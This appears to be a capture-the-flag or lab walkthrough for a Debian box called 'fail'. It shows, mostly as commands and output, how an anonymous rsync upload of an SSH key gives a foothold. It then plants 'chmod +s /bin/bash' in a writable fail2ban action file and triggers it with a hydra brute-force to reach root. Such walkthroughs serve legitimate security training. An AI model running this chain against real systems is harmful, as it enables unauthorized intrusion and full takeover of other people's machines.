 
# Export
```md
export IP="192.168.118.126"
export URL="http://192.168.118.126:80/FUZZ"
```

<hr>

# Initial access
-> Rsync anonymous upload.
```bash
fox@fail:~$ id
uid=1000(fox) gid=1001(fox) groups=1001(fox),1000(fail2ban)
```

<hr>

# Privilege Escalation
+ Critical fail2ban config file
```bash
fox@fail:~$ ls -al /etc/fail2ban/action.d/iptables-multiport.conf
-rw-rw-r-- 1 root fail2ban 1440 Aug 18 19:43 /etc/fail2ban/action.d/iptables-multiport.conf
```

+ Modify config file

```bash
$ nano /etc/fail2ban/action.d/iptables-multiport.conf

[...]
actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>
                chmod +s /bin/bash
[Init]
```

+ Bruteforcing SSH to trigger the `fail2ban` service.

```bash
$ hydra -l fox -P /usr/share/wordlists/rockyou.txt ssh://$IP

[...]
[DATA] attacking ssh://192.168.118.126:22/
[ERROR] ssh target does not support password auth
```

+ `/bin/bash` with SUID bit:

```bash
fox@fail:~$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

+ `root`
```bash
fox@fail:~$ /bin/bash -p
bash-5.0# whoami
root
```

<hr>

# Nmap
```bash
$ sudo nmap --open -sV -A -p- -vv -n -Pn $IP

PORT    STATE SERVICE REASON         VERSION                     
22/tcp  open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)              
| ssh-hostkey:                 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA=
|   256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+
873/tcp open  rsync   syn-ack ttl 63 (protocol version 31)
```

<hr>

# SSH
+ Version 7.9p1

<hr>

# Rsync
+ rsync or remote synchronization is **a software utility for Unix-Like systems that efficiently sync files and directories between two hosts or machines**.

+ Banner grabbing -> Version: 31.0.

```bash
nc -nv $IP 873                                              
(UNKNOWN) [192.168.118.126] 873 (rsync) open
@RSYNCD: 31.0
```

#### Enumeration
```bash
$ nc -nv $IP 873
(UNKNOWN) [192.168.118.126] 873 (rsync) open
@RSYNCD: 31.0 # -> Banner tells us version
@RSYNCD: 31.0 # -> We then send them the same info 
#list # -> Enumerate the server
fox             fox home # -> End enumeration
@RSYNCD: EXIT # -> The server closes connection
```

+ Valid user: `fox`

+ `fox` shares **don't need authentication**:

```bash
$ nc -nv $IP 873
(UNKNOWN) [192.168.118.126] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
fox
@RSYNCD: OK
```

+ Enumerate shares

```bash
$ rsync -av --list-only rsync://$IP/fox                                                                                                                                                 1 ⨯
receiving incremental file list
drwxr-xr-x          4,096 2021/01/21 09:21:59 .
lrwxrwxrwx              9 2020/12/03 15:22:42 .bash_history -> /dev/null
-rw-r--r--            220 2019/04/18 00:12:36 .bash_logout
-rw-r--r--          3,526 2019/04/18 00:12:36 .bashrc
-rw-r--r--            807 2019/04/18 00:12:36 .profile

sent 20 bytes  received 136 bytes  44.57 bytes/sec
total size is 4,562  speedup is 29.24
```

+ Allow anonymous upload? -> YES.
+ Upload SSH key onto the system.

```bash
$ rsync -av authorized_keys rsync://$IP/fox/.ssh 
sending incremental file list
authorized_keys

sent 674 bytes  received 35 bytes  202.57 bytes/sec
total size is 564  speedup is 0.80
```

+ SSH as `fox`:

```bash
$ ssh -i fox_ssh fox@192.168.118.126
Linux fail 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Aug 18 19:30:50 2021 from 192.168.49.118
$ whoami
fox
```
